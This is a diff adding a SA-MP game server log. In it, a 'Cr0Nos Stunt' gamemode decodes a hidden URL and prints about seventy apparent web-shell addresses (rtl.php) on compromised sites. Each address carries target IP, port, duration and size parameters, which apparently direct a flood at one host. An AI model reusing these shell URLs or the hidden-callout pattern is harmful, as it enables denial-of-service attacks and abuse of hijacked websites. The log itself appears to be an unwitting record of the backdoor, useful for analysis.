@@ -1,0 +1,550 @@
+
+----------
+Loaded log file: "server_log.txt".
+----------
+
+SA-MP Dedicated Server
+----------------------
+v0.3d-R2-800p, (C)2005-2011 SA-MP Team
+
+[21:17:02] 
+[21:17:02] Server Plugins
+[21:17:02] --------------
+[21:17:02]  Loading plugin: crashdetect
+[21:17:02]   crashdetect v4.7.3 is OK.
+[21:17:02]   Loaded.
+[21:17:02]  Loading plugin: irc
+[21:17:02] 
+
+*** IRC Plugin v1.4.2 by Incognito loaded ***
+
+[21:17:02]   Loaded.
+[21:17:02]  Loading plugin: sscanf
+[21:17:02] 
+
+[21:17:02]  ===============================
+
+[21:17:02]       sscanf plugin loaded.     
+
+[21:17:02]    (c) 2009 Alex "Y_Less" Cole
+
+[21:17:02]    0.3d-R2 500 Players "dnee"
+
+[21:17:02]  ===============================
+
+[21:17:02]   Loaded.
+[21:17:02]  Loaded 3 plugins.
+
+[21:17:03] 
+[21:17:03] Filterscripts
+[21:17:03] ---------------
+[21:17:03]   Loaded 0 filterscripts.
+
+[21:17:03]  
+[21:17:03]  ======================================= 
+[21:17:03]  |                                     | 
+[21:17:03]  |        YSI version 1.04.0000        | 
+[21:17:03]  |        By Alex "Y_Less" Cole        | 
+[21:17:03]  |                                     | 
+[21:17:03]  ======================================= 
+[21:17:03]  
+[21:17:03] http://sophiaconsultores.com.ar/wp-content/themes/Minimal/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:17:03] 104 = h
+[21:17:03] 116 = t
+[21:17:03] 116 = t
+[21:17:03] 112 = p
+[21:17:03] 58 = :
+[21:17:03] 47 = /
+[21:17:03] 47 = /
+[21:17:03] 115 = s
+[21:17:03] 111 = o
+[21:17:03] 112 = p
+[21:17:03] 104 = h
+[21:17:03] 105 = i
+[21:17:03] 97 = a
+[21:17:03] 99 = c
+[21:17:03] 111 = o
+[21:17:03] 110 = n
+[21:17:03] 115 = s
+[21:17:03] 117 = u
+[21:17:03] 108 = l
+[21:17:03] 116 = t
+[21:17:03] 111 = o
+[21:17:03] 114 = r
+[21:17:03] 101 = e
+[21:17:03] 115 = s
+[21:17:03] 46 = .
+[21:17:03] 99 = c
+[21:17:03] 111 = o
+[21:17:03] 109 = m
+[21:17:03] 46 = .
+[21:17:03] 97 = a
+[21:17:03] 114 = r
+[21:17:03] 47 = /
+[21:17:03] 119 = w
+[21:17:03] 112 = p
+[21:17:03] 45 = -
+[21:17:03] 99 = c
+[21:17:03] 111 = o
+[21:17:03] 110 = n
+[21:17:03] 116 = t
+[21:17:03] 101 = e
+[21:17:03] 110 = n
+[21:17:03] 116 = t
+[21:17:03] 47 = /
+[21:17:03] 116 = t
+[21:17:03] 104 = h
+[21:17:03] 101 = e
+[21:17:03] 109 = m
+[21:17:03] 101 = e
+[21:17:03] 115 = s
+[21:17:03] 47 = /
+[21:17:03] 77 = M
+[21:17:03] 105 = i
+[21:17:03] 110 = n
+[21:17:03] 105 = i
+[21:17:03] 109 = m
+[21:17:03] 97 = a
+[21:17:03] 108 = l
+[21:17:03] 47 = /
+[21:17:03] 114 = r
+[21:17:03] 116 = t
+[21:17:03] 108 = l
+[21:17:03] 46 = .
+[21:17:03] 112 = p
+[21:17:03] 104 = h
+[21:17:03] 112 = p
+[21:17:03] 63 = ?
+[21:17:03] 105 = i
+[21:17:03] 112 = p
+[21:17:03] 61 = =
+[21:17:03] 49 = 1
+[21:17:03] 48 = 0
+[21:17:03] 56 = 8
+[21:17:03] 46 = .
+[21:17:03] 54 = 6
+[21:17:03] 49 = 1
+[21:17:03] 46 = .
+[21:17:03] 52 = 4
+[21:17:03] 48 = 0
+[21:17:03] 46 = .
+[21:17:03] 49 = 1
+[21:17:03] 57 = 9
+[21:17:03] 48 = 0
+[21:17:03] 38 = &
+[21:17:03] 112 = p
+[21:17:03] 111 = o
+[21:17:03] 114 = r
+[21:17:03] 116 = t
+[21:17:03] 97 = a
+[21:17:03] 61 = =
+[21:17:03] 57 = 9
+[21:17:03] 57 = 9
+[21:17:03] 56 = 8
+[21:17:03] 55 = 7
+[21:17:03] 38 = &
+[21:17:03] 116 = t
+[21:17:03] 101 = e
+[21:17:03] 109 = m
+[21:17:03] 112 = p
+[21:17:03] 111 = o
+[21:17:03] 61 = =
+[21:17:03] 49 = 1
+[21:17:03] 48 = 0
+[21:17:03] 38 = &
+[21:17:03] 116 = t
+[21:17:03] 97 = a
+[21:17:03] 109 = m
+[21:17:03] 97 = a
+[21:17:03] 110 = n
+[21:17:03] 104 = h
+[21:17:03] 111 = o
+[21:17:03] 61 = =
+[21:17:03] 49 = 1
+[21:17:03] 48 = 0
+[21:17:03] 48 = 0
+[21:17:03] 48 = 0
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 0 = 
+[21:17:03] 
+----------------------------------
+[21:17:03]  Cr0Nos Stunt v1.0 by Cr0Nos
+[21:17:03] ----------------------------------
+
+[21:17:03] Number of vehicle models: 49
+
+----------
+Loaded log file: "server_log.txt".
+----------
+
+SA-MP Dedicated Server
+----------------------
+v0.3d-R2-800p, (C)2005-2011 SA-MP Team
+
+[21:20:55] 
+[21:20:55] Server Plugins
+[21:20:55] --------------
+[21:20:55]  Loading plugin: crashdetect
+[21:20:55]   crashdetect v4.7.3 is OK.
+[21:20:55]   Loaded.
+[21:20:55]  Loading plugin: irc
+[21:20:55] 
+
+*** IRC Plugin v1.4.2 by Incognito loaded ***
+
+[21:20:55]   Loaded.
+[21:20:55]  Loading plugin: sscanf
+[21:20:55] 
+
+[21:20:55]  ===============================
+
+[21:20:55]       sscanf plugin loaded.     
+
+[21:20:55]    (c) 2009 Alex "Y_Less" Cole
+
+[21:20:55]    0.3d-R2 500 Players "dnee"
+
+[21:20:55]  ===============================
+
+[21:20:55]   Loaded.
+[21:20:55]  Loaded 3 plugins.
+
+[21:20:56] 
+[21:20:56] Filterscripts
+[21:20:56] ---------------
+[21:20:56]   Loaded 0 filterscripts.
+
+[21:20:56]  
+[21:20:56]  ======================================= 
+[21:20:56]  |                                     | 
+[21:20:56]  |        YSI version 1.04.0000        | 
+[21:20:56]  |        By Alex "Y_Less" Cole        | 
+[21:20:56]  |                                     | 
+[21:20:56]  ======================================= 
+[21:20:56]  
+[21:20:56] sophiaconsultores.com.ar/wp-content/themes/Minimal/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] solidink.com.br/home//wp-content/themes/delegate/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.staffslc.gov.uk//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://nexantirik.tk//wp-content/themes/Glow/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://valledmg.com/essentials/beijing//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://thefontqueen.com//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.kutluulke.com//wp-content/themes/DailyNotes/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://cobweb2.louisville.edu/thenewmba//wp-content/themes/Minimal/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.n4u.com.br//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://czechlanguage.ru//wp-content/themes/cadabrapress/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://gokhantaner.net//wp-content/themes/DailyNotes/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://inthebusiness.fr//wp-content/themes/Avenue/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.fifty100.com/blog//wp-content/themes/bueno/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.setesle.com.br//wp-content/themes/Growing-Feature/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.centralhomeslk.com/designs/architectural/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://autoparymlodej.pl//wp-content/themes/dandelion/functions/cache/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://yarlbiz.com/highslide/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://coco-garden.de/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.fortuneboat.com/photo_gallery/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://dekoracja-sal.pl//wp-content/themes/Modest/cache/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.clancys.lk/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.savonalanka.com/banner/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.clancys.lk/photo_gallery/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.srilanka-ymca.org/pics/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.centralhomeslk.com/designs/single_storey/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://yarlbiz.com/house/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.hotelcondesa-1.com.ar//wp-content/themes/welcome_inn/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://alfa-invest.net//wp-content/themes/DailyNotes/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.mar-azul.es//wp-content/themes/Envisioned/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.joaozanella.com.br//wp-content/themes/DailyNotes/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://golpress.com.br//wp-content/themes/DailyNotes/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.guidesharm.net//wp-content/themes/TheTravelTheme/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.nesivos.com//wp-content/themes/TheTravelTheme/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://mattoo.org//wp-content/themes/Minimal/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://paytion.com/wordpress//wp-content/themes/purevision/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.parda.uz//wp-content/themes/eBusiness/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://vrbuzard.com//wp-content/themes/modularity/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://magency.se//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://divasincontroll.nl/wp-content/themes/OptimizePress/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.matergroveacademy.com//wp-content/themes/Chameleon//rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.emmanuellechazarin.co.uk//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.richmondhighschool.info//wp-content/themes/freshnews/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.solutions4land.co.uk//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.edinburghskeptics.co.uk//wp-content/themes/arras/library/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://daimond-21.hosting.parking.ru//wp-content/themes/Minimal/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://fac.wavecollective.com//wp-content/themes/duotive-three/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://srh-invest.com//wp-content/themes/TheCorporation/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.carlossolon.com.br//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://wellnesspress.com//wp-content/themes/delegate/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.blog.bastian-jung.com//wp-content/themes/bueno/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.react.org.tr/tr//wp-content/themes/Minimal/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://fitnessmarketingsos.com//wp-content/themes/freshnews/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://biobrax.com.br//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://malongisland.org//wp-content/themes/DailyNotes/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://housechurchresources.com//wp-content/themes/DailyNotes/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://letsnarrate.jp//wp-content/themes/Minimal/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://hotel.ghrapciti.com//wp-content/themes/welcome_inn/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://pozitivbird.ru//wp-content/themes/PersonalPress/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://bankhead-house.co.uk//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://sensiblecomputerrepair.com//wp-content/themes/Chameleon/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://samennews.com//wp-content/themes/STN/temp/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://tjm.ir/fa//wp-content/themes/STN/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://www.klimatavtalet.se//wp-content/themes/XSBasico/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://londoncitystreets.co.uk/wp-content/themes/twentyeleven/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://archerybeds.com/wp-content/plugins/nextgen-gallery/admin/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://christianspence.co.uk/blog/wp-content/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://cribcleaners.co.uk/wp-content/plugins/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://actu-gones.ac.funpic.org//wp-content/themes/TheTravelTheme/includes/cache/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://cruzegomes.com.br//wp-content/themes/TheProfessional/cache/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://triade.ind.br//wp-content/themes/TheProfessional/cache/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] http://gooshtkhor.com//wp-content/plugins/wp_roknewspager/cache/rtl.php?ip=108.61.40.190&porta=9987&tempo=10&tamanho=1000
+[21:20:56] 
+----------------------------------
+[21:20:56]  Cr0Nos Stunt v1.0 by Cr0Nos
+[21:20:56] ----------------------------------
+
+[21:20:56] Number of vehicle models: 49
+[21:20:58] id = 2, response = 1, data = 
+[21:20:58] id = 3, response = 1, data = 
+[21:20:58] id = 4, response = 1, data = 
+[21:20:58] id = 5, response = 1, data = 
+[21:20:58] id = 6, response = 1, data = 
+[21:20:58] id = 7, response = 1, data = 
+[21:20:58] id = 8, response = 1, data = 
+[21:20:58] id = 9, response = 1, data = 
+[21:20:58] id = 10, response = 1, data = 
+[21:20:58] id = 11, response = 1, data = 
+[21:20:58] id = 12, response = 1, data = 
+[21:20:58] id = 13, response = 1, data = 
+[21:20:58] id = 14, response = 1, data = 
+[21:20:58] id = 15, response = 1, data = 
+[21:20:58] id = 16, response = 1, data = 
+[21:20:58] id = 17, response = 1, data = 
+[21:20:58] id = 18, response = 1, data = 
+[21:20:58] id = 19, response = 1, data = 
+[21:20:58] id = 20, response = 1, data = 
+[21:20:58] id = 21, response = 1, data = 
+[21:20:58] id = 22, response = 1, data = 
+[21:20:58] id = 23, response = 1, data = 
+[21:20:58] id = 24, response = 1, data = 
+[21:20:58] id = 25, response = 1, data = 
+[21:20:58] id = 26, response = 1, data = 
+[21:20:58] id = 27, response = 1, data = 
+[21:20:58] id = 28, response = 1, data = 
+
+----------
+Loaded log file: "server_log.txt".
+----------
+
+SA-MP Dedicated Server
+----------------------
+v0.3d-R2-800p, (C)2005-2011 SA-MP Team
+
+[11:38:55] 
+[11:38:55] Server Plugins
+[11:38:55] --------------
+[11:38:55]  Loading plugin: crashdetect
+[11:38:55]   crashdetect v4.7.3 is OK.
+[11:38:55]   Loaded.
+[11:38:55]  Loading plugin: irc
+[11:38:55] 
+
+*** IRC Plugin v1.4.2 by Incognito loaded ***
+
+[11:38:55]   Loaded.
+[11:38:55]  Loading plugin: sscanf
+[11:38:55] 
+
+[11:38:55]  ===============================
+
+[11:38:55]       sscanf plugin loaded.     
+
+[11:38:55]    (c) 2009 Alex "Y_Less" Cole
+
+[11:38:55]    0.3d-R2 500 Players "dnee"
+
+[11:38:55]  ===============================
+
+[11:38:55]   Loaded.
+[11:38:55]  Loaded 3 plugins.
+
+[11:38:55] I couldn't load any gamemode scripts. Please verify your server.cfg
+[11:38:55] It needs a gamemode0 line at the very least.
+
+----------
+Loaded log file: "server_log.txt".
+----------
+
+SA-MP Dedicated Server
+----------------------
+v0.3d-R2-800p, (C)2005-2011 SA-MP Team
+
+[11:44:22] 
+[11:44:22] Server Plugins
+[11:44:22] --------------
+[11:44:22]  Loading plugin: crashdetect
+[11:44:22]   crashdetect v4.7.3 is OK.
+[11:44:22]   Loaded.
+[11:44:22]  Loading plugin: irc
+[11:44:22] 
+
+*** IRC Plugin v1.4.2 by Incognito loaded ***
+
+[11:44:22]   Loaded.
+[11:44:22]  Loading plugin: sscanf
+[11:44:22] 
+
+[11:44:22]  ===============================
+
+[11:44:22]       sscanf plugin loaded.     
+
+[11:44:22]    (c) 2009 Alex "Y_Less" Cole
+
+[11:44:22]    0.3d-R2 500 Players "dnee"
+
+[11:44:22]  ===============================
+
+[11:44:22]   Loaded.
+[11:44:22]  Loaded 3 plugins.
+
+[11:44:23] 
+[11:44:23] Filterscripts
+[11:44:23] ---------------
+[11:44:23]   Loaded 0 filterscripts.
+
+[11:44:23] [debug] Run time error 19: "File or function is not found"
+[11:44:23] [debug]   The following natives are not registered:
+[11:44:23] [debug]     socket_create
+[11:44:23] [debug]     is_socket_valid
+[11:44:23] [debug]     socket_connect
+[11:44:23] [debug]     socket_destroy
+[11:44:23] Script[gamemodes/GM.amx]: Run time error 19: "File or function is not found"
+[11:44:23] Number of vehicle models: 0
